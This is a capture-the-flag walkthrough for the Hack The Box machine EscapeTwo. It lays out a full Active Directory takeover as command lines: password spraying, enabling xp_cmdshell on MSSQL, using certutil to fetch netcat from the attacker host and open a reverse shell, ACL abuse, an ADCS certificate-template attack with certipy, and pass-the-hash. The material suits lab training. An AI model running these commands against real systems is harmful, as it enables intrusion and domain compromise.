# EscapeTwo HTB Walkthrough

[![Hack The Box](https://img.shields.io/badge/HackTheBox-EscapeTwo-green?logo=hackthebox)](https://app.hackthebox.com/machines/642)
[![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-green)](https://github.com/HTB/Challenges)
[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-blue)](https://github.com/HTB/Challenges)
[![Topic: Active Directory](https://img.shields.io/badge/Topic-Active%20Directory-yellowgreen)](https://en.wikipedia.org/wiki/Active_Directory)

---

## Overview

EscapeTwo is an easy Windows domain machine showcasing a full AD domain takeover:
- Starting with user credentials for domain enumeration and SMB share access,
- Fixing a corrupted Excel file header to extract hidden credentials,
- Using extracted credentials for MSSQL authentication and command execution (xp_cmdshell),
- Leveraging reverse shell with Netcat and certutil for lateral movement,
- Performing password spraying on WinRM and SMB for further access,
- Enumerating and abusing AD ACLs to control certificate services user,
- Exploiting misconfigured Active Directory Certificate Services (ADCS) to impersonate domain admin,
- Finally, gaining domain admin access and retrieving the root flag.

---

## Table of Contents

- [1. Initial Enumeration](#1-initial-enumeration)
- [2. SMB Share Enumeration and File Extraction](#2-smb-share-enumeration-and-file-extraction)
- [3. Repairing Corrupted Excel File](#3-repairing-corrupted-excel-file)
- [4. Password Spraying and MSSQL Access](#4-password-spraying-and-mssql-access)
- [5. Enabling xp_cmdshell and Reverse Shell](#5-enabling-xp_cmdshell-and-reverse-shell)
- [6. Lateral Movement Using WinRM](#6-lateral-movement-using-winrm)
- [7. Active Directory Enumeration with BloodHound](#7-active-directory-enumeration-with-bloodhound)
- [8. ACL Abuse and ADCS Enumeration](#8-acl-abuse-and-adcs-enumeration)
- [9. Exploiting Vulnerable Certificate Template](#9-exploiting-vulnerable-certificate-template)
- [10. Domain Admin Access and Root Flag](#10-domain-admin-access-and-root-flag)
- [11. Stepwise PoC](#11-stepwise-poc)

---

## 1. Initial Enumeration
```
ports=$(nmap -p- --min-rate=1000 -T4 10.129.232.128 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.232.128
```

- Scans all TCP ports, extracts open ports, then runs version detection and default NSE scripts on those ports.
- Open services included SMB(445), LDAP(389), Kerberos(88), and MSSQL(1433).
 ```
 echo "10.129.232.128 sequel.htb dc01.sequel.htb" | sudo tee -a /etc/hosts`
 ```
- Adds IP to hosts for domain resolution.

---

## 2. SMB Share Enumeration and File Extraction
```
netexec smb 10.129.232.128 -u rose -p 'KxEPkKe6R8su' --shares
impacket-smbclient sequel.htb/rose:'KxEPkKe6R8su'@10.129.232.128
use Accounting Department
ls
get accounts.xlsx`
```
- Lists SMB shares accessible with user `rose`.
- Downloads `accounts.xlsx` – a corrupted Excel file suspected to contain secrets.

---

## 3. Repairing Corrupted Excel File
```
file accounts.xlsx
7z x accounts.xlsx
hexedit accounts.xlsx
xxd accounts.xlsx
```
- Determine file type: `.xlsx` files are ZIP archives.
- Extraction fails due to corrupted header bytes `50 48 04 03`.
- Manual hex edit to fix header to standard ZIP magic bytes `50 4B 03 04`.
- File opens successfully, revealing credentials inside.

---

## 4. Password Spraying and MSSQL Access

`netexec smb 10.129.232.128 -u users.txt -p pass.txt`

- Password spray with user and password lists to find valid combinations (finds valid user `oscar`).

```
netexec mssql 10.129.232.128 -u sa -p 'MSSQLP@ssw0rd!' --local-auth
impacket-mssqlclient sequel.htb/'sa:MSSQLP@ssw0rd!'@10.129.232.128
```
- Connect to MSSQL with high-privilege `sa` account using found credentials.

Enable command execution:
```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```
- Enables `xp_cmdshell` procedure to run OS commands, reveals `sequel\sql_svc` user.

---

## 5. Enabling xp_cmdshell and Reverse Shell
```
nc -lnvp 4455
python3 -m http.server 4000
```
- Start a Netcat listener and simple HTTP server locally.
- Start a Netcat listener and simple HTTP server locally.

```
EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.96:4000/nc64.exe C:\Users\sql_svc\Desktop\nc64.exe';
EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.14.96 4455';
```
- Downloads Netcat to victim using `certutil`.
- Executes Netcat to connect back and spawn a reverse shell on attacker machine.

---

## 6. Lateral Movement Using WinRM
```
net user
nxc winrm sequel.htb -u Users.txt -p 'WqSZAF6CysDQbGb3'
evil-winrm -i 10.129.232.128 -u ryan -p 'WqSZAF6CysDQbGb3'
```
- Enumerate users on Windows.
- Spray Password on WinRM port 5985 to find valid login (`ryan`).
- Use Evil-WinRM to spawn remote PowerShell session as `ryan`.
- Retrieve user flag for confirmation.

---

## 7. Active Directory Enumeration with BloodHound

`bloodhound-python -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb -ns 10.129.232.128 -c all --zip`

- Perform comprehensive enumeration of AD structure, permissions, and sessions.
- Identify privilege escalation paths involving `ca_svc` account.

---

## 8. ACL Abuse and ADCS Enumeration
```
python owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' sequel.htb/ryan:'WqSZAF6CysDQbGb3'
python dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' sequel.htb/ryan:'WqSZAF6CysDQbGb3'
```
- Change ownership and grant `FullControl` to `ryan` over `ca_svc`.
- Also we can reset `ca_svc` password via PowerView or similar tools.

---

## 9. Exploiting Vulnerable Certificate Template
 ```
 certipy shadow -account ca_svc -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' auto 
 certipy find -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -stdout -text
 certipy template -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -template 'DunderMifflinAuthentication' -save-old
 certipy req -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' -upn     
 administrator@sequel.htb -dns dc01.sequel.htb	
 certipy auth -pfx administrator_dc01.pfx
```
- Enumerate CA templates and spot misconfigurations.
- Modify template to remove approval requirement and enable client authentication.
- Request a certificate impersonating administrator.
- Authenticate with the certificate and extract domain admin NTLM hash.

---

## 10. Domain Admin Access and Root Flag
```
evil-winrm -i 10.128.124.12 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
whoami
type C:\Users\Administrator\Desktop\root.txt
```
- Use domain admin NTLM hash for pass-the-hash WinRM login.
- Gain full domain admin shell and capture root flag.

---

## 11. Stepwise PoC

<details>
<summary>💻<strong>(click to expand)</strong> </summary>
<img width="1567" height="841" alt="39" src="https://github.com/user-attachments/assets/cf78e34a-3d0b-4eba-b639-657c3207a13f" />
<img width="1163" height="746" alt="38" src="https://github.com/user-attachments/assets/da0d5c09-c9f9-4460-8e48-01f1d860b11b" />
<img width="1090" height="94" alt="37" src="https://github.com/user-attachments/assets/fa326e43-0f87-4fae-80d0-1ba35e1adc18" />
<img width="1827" height="468" alt="36" src="https://github.com/user-attachments/assets/ae250058-a54a-45de-bcdf-3b4808ff4148" />
<img width="1224" height="622" alt="35" src="https://github.com/user-attachments/assets/6264ec1c-f2dc-4f0e-af5e-c2da8b4e02a1" />
<img width="1908" height="147" alt="34" src="https://github.com/user-attachments/assets/29b6aaa8-2abd-4668-b769-e8a1fa85d4c4" />
<img width="1835" height="726" alt="33" src="https://github.com/user-attachments/assets/6e94d1d3-a9e7-4f54-9a8f-6cd5b31eb144" />
<img width="838" height="356" alt="32" src="https://github.com/user-attachments/assets/e0670fcf-38fa-414d-95f5-0018013d7ad2" />
<img width="1213" height="843" alt="31" src="https://github.com/user-attachments/assets/57a3e493-1569-4cde-9b44-a19696eda0d8" />
<img width="1200" height="816" alt="30" src="https://github.com/user-attachments/assets/11129b40-7bd6-4b84-ab19-d9aad51dbc28" />
<img width="1107" height="662" alt="29" src="https://github.com/user-attachments/assets/a8e0e96f-bef7-4918-8afb-5eff7c8844ed" />
<img width="1381" height="341" alt="28" src="https://github.com/user-attachments/assets/56c42ec9-919b-4ae6-80ee-9429d9ba82ac" />
<img width="1399" height="597" alt="27" src="https://github.com/user-attachments/assets/796b65f9-7d01-4e5c-bd7f-3f6b066c7431" />
<img width="1410" height="811" alt="26" src="https://github.com/user-attachments/assets/5151efae-e489-4f7a-bb5c-f86837eb53c7" />
<img width="749" height="170" alt="25" src="https://github.com/user-attachments/assets/666da45b-b6d6-418a-a0c0-924a0fd2092b" />
<img width="843" height="136" alt="24" src="https://github.com/user-attachments/assets/d23abef6-7ce1-462e-ac88-f5368e5caf20" />
<img width="1405" height="485" alt="23" src="https://github.com/user-attachments/assets/0564f09f-007f-4a6b-b692-eed71288a235" />
<img width="1698" height="772" alt="22" src="https://github.com/user-attachments/assets/1c69f4a6-56ea-4708-9614-17b8b70abfcf" />
<img width="867" height="501" alt="21" src="https://github.com/user-attachments/assets/ada0b434-acf4-468a-8907-fed186ba56e1" />
<img width="920" height="718" alt="20" src="https://github.com/user-attachments/assets/0640dfdf-667d-443e-9334-8783ab7deb1b" />
<img width="756" height="707" alt="19" src="https://github.com/user-attachments/assets/6726c592-3a77-4f8f-adc7-75a3edbacfba" />
<img width="948" height="380" alt="18" src="https://github.com/user-attachments/assets/6763d4a1-5373-4952-a383-278ae40c5662" />
<img width="1055" height="471" alt="17" src="https://github.com/user-attachments/assets/6b46c9bd-0378-4ece-8dd7-60dab7bc2fe8" />
<img width="1003" height="487" alt="16" src="https://github.com/user-attachments/assets/ce2f4474-46e9-4f5a-b943-871f87cd5c95" />
<img width="976" height="730" alt="15" src="https://github.com/user-attachments/assets/92426af9-b80f-4dae-828d-6f856206a30c" />
<img width="1593" height="848" alt="14" src="https://github.com/user-attachments/assets/5a0817fc-c347-40eb-8698-6166d9567721" />
<img width="1026" height="281" alt="13" src="https://github.com/user-attachments/assets/87cad8f2-7a3f-4e75-b1da-e47eb4a82156" />
<img width="1007" height="304" alt="12" src="https://github.com/user-attachments/assets/5518be24-e84c-44f2-872a-35ba15410648" />
<img width="1010" height="212" alt="11" src="https://github.com/user-attachments/assets/c3a935f3-c6c9-4309-aec8-d80d04944e44" />
<img width="1593" height="711" alt="10" src="https://github.com/user-attachments/assets/8cc34080-7466-4aba-b90e-77dbf06a296b" />
<img width="1015" height="356" alt="9" src="https://github.com/user-attachments/assets/3c88a4f3-850c-4a52-aebc-0469eaa36d2b" />
<img width="1010" height="233" alt="8" src="https://github.com/user-attachments/assets/83a27c6d-c699-4552-bbb7-ae764d6d7025" />
<img width="1591" height="663" alt="7" src="https://github.com/user-attachments/assets/8140794e-8d30-4c0c-a6d2-c1dfa0eb2a80" />
<img width="1829" height="669" alt="6" src="https://github.com/user-attachments/assets/fc9acdee-23bd-40b6-9252-49e88eda588d" />
<img width="1227" height="691" alt="5" src="https://github.com/user-attachments/assets/52dca908-e45d-4e9c-acea-5857fdfd71cc" />
<img width="1016" height="287" alt="4" src="https://github.com/user-attachments/assets/526a5f64-d973-4f41-bfcb-becbeaaf0bf0" />
<img width="1008" height="452" alt="3" src="https://github.com/user-attachments/assets/fef3eb82-7daf-4cff-a6c7-6a6291d7a28b" />
<img width="1011" height="509" alt="2" src="https://github.com/user-attachments/assets/60caf3be-d8a5-4a40-ab17-9083b37c7c9a" />
<img width="1021" height="478" alt="1" src="https://github.com/user-attachments/assets/05301ce8-6ced-4939-85b8-36b4e99999a1" />

</details>

---

## Tools & References

- **NetExec (nxc):** Network service exploitation and spraying
- **Impacket:** SMB and MSSQL clients
- **BloodHound:** AD permission visualizer and enumeration
- **Certipy:** ADCS enumeration and exploitation
- **Evil-WinRM:** Remote PowerShell shell over WinRM
- **Standard Linux tools:** `nmap`, `netcat`, `file`, `7z`, `hexedit`

---

## Final Notes

- Master the flow from enumeration → foothold → lateral movement → escalation.
- ADCS misconfiguration remains a powerful vector in domain takeovers.
- Proper ACL management and template hardening are critical defenses.

---




